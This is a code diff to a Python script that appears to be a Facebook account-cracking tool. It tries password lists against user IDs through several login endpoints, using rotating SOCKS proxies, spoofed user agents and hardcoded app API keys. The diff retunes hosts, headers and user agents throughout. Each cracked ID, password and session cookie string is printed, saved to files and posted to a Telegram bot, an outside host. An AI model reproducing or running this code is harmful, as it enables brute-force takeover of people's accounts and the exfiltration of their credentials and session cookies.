@@ -698,14 +698,14 @@ def m1(ids,pwv):
     session = requests.Session()
     nip=random.choice(proxsi)
     proxs= {'http': 'socks4://'+nip}
-    ua = DEF3()
+    ua = ugrn
     DOMAIN = ("m","business","mbasic")
     fb= random.choice(DOMAIN)
     uger = random.choice(ugrn)
     warna = random.choice(my_color)
     try:
         for pas in pwv:
-            free_fb = session.get(f'https://free.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             info={
             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -717,7 +717,7 @@ def m1(ids,pwv):
             "pass":pas,
             "login":"Log In"}
             update={
-            'Host': f'{fb}.facebook.com',
+            'Host': 'm.facebook.com',
             'Connection': 'keep-alive',
             'Content-Length': str(len(str(info))),
             'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
@@ -734,11 +734,11 @@ def m1(ids,pwv):
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua-platform': '"Android"',
             'Accept': '*/*',
-            'Origin': f'https://{fb}.facebook.com',
+            'Origin': 'https://m.facebook.com',
             'Sec-Fetch-Site': 'same-origin',
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Dest': 'empty',
-            'Referer': f'https://{fb}.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&_rdr',
+            'Referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&_rdr',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'}
             session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?',data=info,headers=update,proxies=proxs,allow_redirects=False).text
@@ -750,7 +750,7 @@ def m1(ids,pwv):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                         print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
-                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
+                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                         cek_apk(kuki)
                         statusok = (f" {cid} | {pas} | {kuki} ")
                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
@@ -1529,7 +1529,7 @@ def __MTDTWOO__(ids, names, passlist, total_ids):
             pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
             netheni = str(random.randint(20000, 40000))
             simheni = str(random.randint(20000, 40000))
-            user_agent = mls2()
+            user_agent = DEF3()
             warna = random.choice(my_color)
             adid = str(uuid.uuid4())
             device_id = str(uuid.uuid4())
@@ -1558,7 +1558,7 @@ def __MTDTWOO__(ids, names, passlist, total_ids):
                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                 "api_key": "882a8490361da98702bf97a021ddc14d"}
             headers = [
-                f'User-Agent: {user_agent.encode("utf-8")}',
+                f'User-Agent: {user_agent}',
                 'Content-Type: application/x-www-form-urlencoded',
                 'Host: graph.facebook.com',
                 f'X-FB-Net-HNI: {netheni}',
@@ -1628,7 +1628,7 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
             netheni = str(random.randint(20000, 40000))
             simheni = str(random.randint(20000, 40000))
-            user_agent = mls3()
+            user_agent =  DEF3()
             warna = random.choice(my_color)
             adid = str(uuid.uuid4())
             device_id = str(uuid.uuid4())
@@ -1657,7 +1657,7 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                 "api_key": "882a8490361da98702bf97a021ddc14d"}
             headers = [
-                f'User-Agent: {user_agent.encode("utf-8")}',
+                f'User-Agent: {user_agent}',
                 'Content-Type: application/x-www-form-urlencoded',
                 'Host: graph.facebook.com',
                 f'X-FB-Net-HNI: {netheni}',
@@ -1727,7 +1727,7 @@ def __MTDFOUR__(ids, names, passlist, total_ids):
             pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
             netheni = str(random.randint(20000, 40000))
             simheni = str(random.randint(20000, 40000))
-            user_agent = mls4()
+            user_agent = DEF3()
             warna = random.choice(my_color)
             adid = str(uuid.uuid4())
             device_id = str(uuid.uuid4())
@@ -1756,7 +1756,7 @@ def __MTDFOUR__(ids, names, passlist, total_ids):
                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                 "api_key": "882a8490361da98702bf97a021ddc14d"}
             headers = [
-                f'User-Agent: {user_agent.encode("utf-8")}',
+                f'User-Agent: {user_agent}',
                 'Content-Type: application/x-www-form-urlencoded',
                 'Host: graph.facebook.com',
                 f'X-FB-Net-HNI: {netheni}',
@@ -1826,7 +1826,7 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
             pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
             netheni = str(random.randint(20000, 40000))
             simheni = str(random.randint(20000, 40000))
-            user_agent = mls5()
+            user_agent = DEF3()
             warna = random.choice(my_color)
             adid = str(uuid.uuid4()).upper()
             device_id = str(uuid.uuid4()).upper()
@@ -1862,7 +1862,7 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
                 "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                 f"X-FB-Net-HNI: {netheni}",
                 f"X-FB-SIM-HNI: {simheni}",
-                f"User-Agent: {user_agent.encode('utf-8')}",
+                f"User-Agent: {user_agent}",
                 "X-FB-Client-IP: True",
                 "X-FB-Request-Analytics-Tags: graphservice",
                 "X-Tigon-Is-Retry: False",
@@ -1931,16 +1931,25 @@ def __MTDSIX__(ids, names, passlist, total_ids):
             warna = random.choice(my_color)
             session = requests.Session()
             free_fb = session.get('https://m.facebook.com').text
-            data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+            data = {
+            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":ids,
+            "pass":pas,
+            "login":"Log In"}
             headers ={
-            "authority": f'p.facebook.com',
+            "authority": 'm.facebook.com',
             "method": 'POST',
             "scheme": 'https',
             "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             "accept-encoding": 'gzip, deflate, br',
             "accept-language": 'en-US,en;q=0.9',
             "cache-control": 'no-cache, no-store, must-revalidate',
-            "referer": f'https://p.facebook.com/',
+            "referer": f'https://m.facebook.com/',
             "sec-ch-ua": '"Google Chrome";v="90", "Chromium";v="90"',
             "sec-ch-ua-mobile": '?0',
             "sec-ch-ua-platform": "Windows",
@@ -1953,10 +1962,10 @@ def __MTDSIX__(ids, names, passlist, total_ids):
             "cross-origin-resource-policy": 'cross-origin',
             "upgrade-insecure-requests": '1',
             "user-agent": 'Mozilla/5.0 (Linux; Android 10; SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',}
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,headers=headers).text
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,headers=headers).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
-                kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = coki[65:80]
                 print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {cid} {rad}: {green}{pas}')
                 print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
@@ -1964,7 +1973,7 @@ def __MTDSIX__(ids, names, passlist, total_ids):
                 oks.append(cid)
                 statusok = (f" {cid} | {pas} | {kuki} ")
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/BITHIKA-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
+                open('/sdcard/BITHIKA-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                 break
             elif "User must verify their account" in lo:
                 cps.append(ids)
